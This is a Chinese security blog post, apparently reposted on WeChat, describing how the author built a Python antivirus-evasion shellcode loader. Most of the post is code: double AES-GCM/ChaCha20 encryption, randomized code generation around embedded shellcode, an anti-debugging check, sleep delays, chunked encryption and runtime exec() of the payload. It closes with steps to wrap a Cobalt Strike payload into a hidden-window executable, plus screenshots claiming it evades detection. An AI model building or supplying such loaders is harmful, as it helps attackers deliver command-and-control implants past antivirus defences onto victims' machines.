---
title: python免杀工具学习记录
url: https://mp.weixin.qq.com/s/7Nj5W7U29TMwMvqZVPeUyw
source: Doonsec's feed
date: 2026-04-24
fetch_date: 2026-04-25T04:33:57.396211
---

# python免杀工具学习记录

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mwFvjeHDLkiaXLJib1iahXINc0TRSiaGgxgNW8K56TItt3Tl7DYw9UP62iapNXehvfxmxK7j5ZibjBxEoVYz0Ducbc7xI23HbYVIjI1rfBzpv0aho/0?wx_fmt=jpeg)

# python免杀工具学习记录

蚁景网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于Tide安全团队
，作者Komorebi

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7f2r4cHKV0tKOK4v87qvAYZazjibgqC5HkYyaQeibGau4g/0)

**Tide安全团队**
.

Tide安全团队以信安技术研究为目标，致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、Web安全、移动终端、安全开发、物联网/工控安全/AI安全等多个领域，对安全感兴趣的小伙伴可以关注我们。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png)

# 0x01 前言

最近学习了一下免杀相关的知识，参考了互联网几个公开项目的思路,尝试自己开发了一个小工具，本文主要用来记录一下主要思路。

# 0x02 思路

根据大部分公开工具的思路来看，发现可以采用多层防护的架构设计以获得比较突出的免杀效果，主要包含以下几个核心组件：

```
密钥生成器
主加载器
加密payload
配置管理
```

# 0x03 实现核心功能

## 密钥生成

* AES-GCM + ChaCha20 组合加密

```
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
import os

def hybrid_encrypt(data: bytes) -> tuple:
    # AES-GCM加密
    aes_key = os.urandom(32)
    aes_nonce = os.urandom(12)
    aes_cipher = AESGCM(aes_key)
    aes_encrypted = aes_cipher.encrypt(aes_nonce, data, None)

    # ChaCha20二次加密
    chacha_key = os.urandom(32)
    chacha_nonce = os.urandom(12)
    chacha_cipher = ChaCha20Poly1305(chacha_key)
    final_encrypted = chacha_cipher.encrypt(chacha_nonce, aes_encrypted, None)

    return final_encrypted, aes_key, aes_nonce, chacha_key, chacha_nonce
```

这里使用两种不同算法组合，增加破解难度;AES-GCM提供认证加密，ChaCha20提供速度。

* 随机分割符密钥

```
ran_num = random.randint(1,10)  # 随机长度1-10
ranStr = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], ran_num))
split = ranStr + '=bypass'  # 分割符格式
```

使用长度随机+字符随机以获得更好的免杀效果

* 动态代码结构密钥

```
x = '''
import ctypes

'''+ranStr+'''=bytearray('''+shellcode+''')
'''+split+'''
# ... 后续代码
'''
```

这里使用随机字符串作为变量名，并且每次生成不同的代码结构。

## 反调试功能

使用Windows API IsDebuggerPresent() 检测是否在调试器环境中运行,如果检测到调试器，那么返回False并记录警告日志.

```
def _anti_debug(self):
    """反调试功能"""
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            logger.warning("检测到调试器")
            return False
        return True
    except Exception as e:
        logger.error(f"反调试检查失败: {str(e)}")
        return True
```

## 适当增加延迟

添加随机延迟,可以增加行为分析的难度

```
random_delay = random.randint(1, 10) * 0.1
time.sleep(random_delay)
```

应用场景：

```
logger.debug("开始执行payload")
# 使用base64编码
encoded_payload = base64.b64encode(payload.encode('utf-8'))

# 添加随机延迟
random_delay = random.randint(1, 10) * 0.1
time.sleep(random_delay)

# 执行payload
exec(payload)
```

## 代码分割和分块加密

将长代码分割成64字节的小块，然后每个块单独加密，避免整体特征识别，从而破坏代码的完整性特征，增加静态分析难度。

```
def encrypt_message(self, message: str, chunk_size: int = 64) -> List[str]:
    """将消息分块加密"""
    chunks = [message[i:i+chunk_size] for i in range(0, len(message), chunk_size)]
    encrypted_chunks = []
    for i, chunk in enumerate(chunks):
        encrypted_chunk = self.fernet.encrypt(chunk.encode('utf-8'))
        encrypted_chunks.append(encrypted_chunk)
    return encrypted_chunks
```

## 运行时解密执行

延迟解密策略

```
def execute_payload(self, payload: str):
    # 使用base64编码
    encoded_payload = base64.b64encode(payload.encode('utf-8'))
    # 添加随机延迟
    random_delay = random.randint(1, 10) * 0.1
    time.sleep(random_delay)
    # 执行payload
    exec(payload)
```

使用exec()动态执行，绕过静态检测。静态扫描时只能看到加密后的代码，只有在运行时才进行解密和执行， 总体来说，这个脚本我采用的思路主要有六部分

```
代码分割：可以破坏完整性特征
双重加密：形成了多层防护体系
动态生成：避免固定特征
运行时解密：用来绕过静态检测
日志混淆：可以干扰分析过程
异常伪装 - 模拟正常软件
```

这些技术相互配合，形成了一个相对完整的免杀防护体系，进而提高了绕过杀毒软件检测的成功率。

# 0x04 实际效果

1、首先生成免杀的exe

```
pyinstaller --onefile --hidden-import cryptography bypass.py
```

打包生成可执行exe

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdXUtWOruAKd7ibOylwQHNzB0qrI5KmwgFmwfCW2wZbuY5kdupNpXicjxLENLlibY2jjCmkKibGk3icKfYHFGwNYGhc4el6o85HohqHQ/640?wx_fmt=png&from=appmsg)

2、然后使用CS生成python类型payload

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jS2mB7OlsdXsxrjlaHK6E1lbrrhEyswBrJlPZsqcLJ8En3T5TYfCiaDr6mv2icwLc9ySJwNhcdRkrIdZp59fwB9V2vXVsCHoq83qdMPViaeticA/640?wx_fmt=webp&from=appmsg)

3、使用密钥生成脚本生成3个key值后，依次填入主程序脚本中的中三个留空值，然后使用

```
pyinstaller --onefile --hidden-import cryptography --windowed bypass.py
```

打包输出隐藏控制台窗口的可执行文件exe，输出在dist目录下. 双击或命令行start即可执行。

# 0x05 免杀效果

![](https://mmbiz.qpic.cn/mmbiz_jpg/jS2mB7OlsdULVXSce1skmiaSmbbENrJ5eoJuiadMxofYNAHIFFN4zgwHtOT80sBk8wufyzHJRhKv8eSBlAGJqIicyKAIcEBgpkDib4wRdLibmKOA/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jS2mB7OlsdXnSp1giaTdlmGOq3h1GQBSds6HwH37spj1AtwouZpp6hrfL1erwSbc3bAwibIPCkbtLsDEjiahEP26PSMViado5eqlq0jQ915d9CE/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/jS2mB7OlsdUyfVeOZia87IFsZosrprOnpGc3WlbjfFd4uotT0V3awkTZnsltictWzicynyWjU1q94LgojZIZBzMccoKHloUWvn5ZjhfCOk0ibJo/640?wx_fmt=png&from=appmsg)

# 0x06 参考项目

https://github.com/langsasec/c2-shellcode-py

https://blog.csdn.net/qq\_32261191/article/details/108994177

https://github.com/Soufaker/moon\_kill

https://github.com/HZzz2/python-shellcode-loader

[![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwoHriaVoyA6JNsGroYQAQp8xrlxS8RibJWibDF8T1pmkgSXqiaWQvmVB43S1IVCFBDOKTEQFDAP0QL5g/640?wx_fmt=png&from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxTbkTSkrHtQAicCy4EPuqw9hf0VFTmn6c4UGChaiaoHSBewgtiblmSAOPRq8CmibczDaBzzpfN5IkrFQ/0?wx_fmt=png)

蚁景网络安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxTbkTSkrHtQAicCy4EPuqw9hf0VFTmn6c4UGChaiaoHSBewgtiblmSAOPRq8CmibczDaBzzpfN5IkrFQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过